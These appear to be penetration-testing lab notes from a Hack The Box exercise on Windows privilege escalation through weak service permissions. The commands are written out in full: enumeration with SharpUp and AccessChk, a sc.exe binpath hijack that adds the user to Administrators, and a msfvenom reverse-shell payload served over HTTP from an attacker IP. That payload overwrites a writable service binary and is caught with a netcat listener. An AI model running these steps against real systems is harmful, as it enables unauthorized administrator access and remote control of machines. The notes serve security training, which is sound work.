# Weak Permissions

## [SharpUp](https://github.com/GhostPack/SharpUp/)

```pwsh
PS C:\Users\htb-student> C:\Tools\SharpUp.exe audit
```

```output title="Output" hl_lines="6-11 16-21"
=== SharpUp: Running Privilege Escalation Checks ===


=== Modifiable Services ===

  Name             : WindscribeService
  DisplayName      : WindscribeService
  Description      : Manages the firewall and controls the VPN tunnel
  State            : Running
  StartMode        : Auto
  PathName         : "C:\Program Files (x86)\Windscribe\WindscribeService.exe"


=== Modifiable Service Binaries ===

  Name             : SecurityService
  DisplayName      : PC Security Management Service
  Description      : Responsible for managing PC security
  State            : Stopped
  StartMode        : Auto
  PathName         : "C:\Program Files (x86)\PCProtect\SecurityService.exe"


=== AlwaysInstallElevated Registry Keys ===



=== Modifiable Folders in %PATH% ===



=== Modifiable Registry Autoruns ===



=== *Special* User Privileges ===



=== Unattended Install Files ===



=== McAfee Sitelist.xml Files ===



=== Cached GPP Password ===

  [X] Exception: Could not find a part of the path 'C:\ProgramData\Microsoft\Group Policy\History'.


[*] Completed Privesc Checks in 4 seconds
```

## Modifiable Services

### AccessChk

```pwsh
PS C:\Users\htb-student> C:\Tools\AccessChk\accesschk.exe /accepteula \pipe\WindscribeService -w -v
```

```output title="Output" hl_lines="38"
Accesschk v6.13 - Reports effective permissions for securable objects
Copyright ⌐ 2006-2020 Mark Russinovich
Sysinternals - www.sysinternals.com

\\.\Pipe\WindscribeService
  Medium Mandatory Level (Default) [No-Write-Up]
  RW BUILTIN\Guests
        FILE_ADD_FILE
        FILE_CREATE_PIPE_INSTANCE
        FILE_APPEND_DATA
        FILE_EXECUTE
        FILE_LIST_DIRECTORY
        FILE_READ_ATTRIBUTES
        FILE_READ_DATA
        FILE_READ_EA
        FILE_TRAVERSE
        FILE_WRITE_ATTRIBUTES
        FILE_WRITE_DATA
        FILE_WRITE_EA
        SYNCHRONIZE
        READ_CONTROL
  RW NT AUTHORITY\Authenticated Users
        FILE_ADD_FILE
        FILE_CREATE_PIPE_INSTANCE
        FILE_APPEND_DATA
        FILE_EXECUTE
        FILE_LIST_DIRECTORY
        FILE_READ_ATTRIBUTES
        FILE_READ_DATA
        FILE_READ_EA
        FILE_TRAVERSE
        FILE_WRITE_ATTRIBUTES
        FILE_WRITE_DATA
        FILE_WRITE_EA
        SYNCHRONIZE
        READ_CONTROL
  RW BUILTIN\Administrators
        FILE_ALL_ACCESS
```

### WindscribeService Binary Path Configuration

```pwsh
PS C:\Users\htb-student> sc.exe config WindscribeService binpath="net localgroup Administrators htb-student /add"
```

```output title="Output"
[SC] ChangeServiceConfig SUCCESS
```

### WindscribeService Stop

```pwsh
PS C:\Users\htb-student> sc.exe stop WindscribeService
```

### WindscribeService Start

```pwsh
PS C:\Users\htb-student> sc.exe start WindscribeService
```

### Attack Results

```pwsh
PS C:\Users\htb-student> net localgroup Administrators
```

```output title="Output" hl_lines="8"
Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
htb-student
mrb3n
The command completed successfully.
```

## Modifiable Service Binaries

### Permissions

```pwsh
PS C:\Users\htb-student> icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"
```

```output title="Output" hl_lines="2"
C:\Program Files (x86)\PCProtect\SecurityService.exe BUILTIN\Users:(I)(F)
                                                     Everyone:(I)(F)
                                                     NT AUTHORITY\SYSTEM:(I)(F)
                                                     BUILTIN\Administrators:(I)(F)
                                                     APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                                     APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```

### Creating the Payload

```sh
my@attack:~$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.164 LPORT=9001 -f exe -o SecurityService.exe
```

### Web Server

```sh
my@attack:~$ python3 -m http.server 8888
```

### Replacing Service Binary

```pwsh
PS C:\Users\htb-student> Invoke-WebRequest -Uri "http://10.10.14.164:8888/SecurityService.exe" -OutFile "C:\Program Files (x86)\PCProtect\SecurityService.exe"
```

### Netcat

```sh
my@attack:~$ nc -lvnp 9001
```

### Reverse Shell

```pwsh
PS C:\Users\htb-student> sc.exe start SecurityService
```
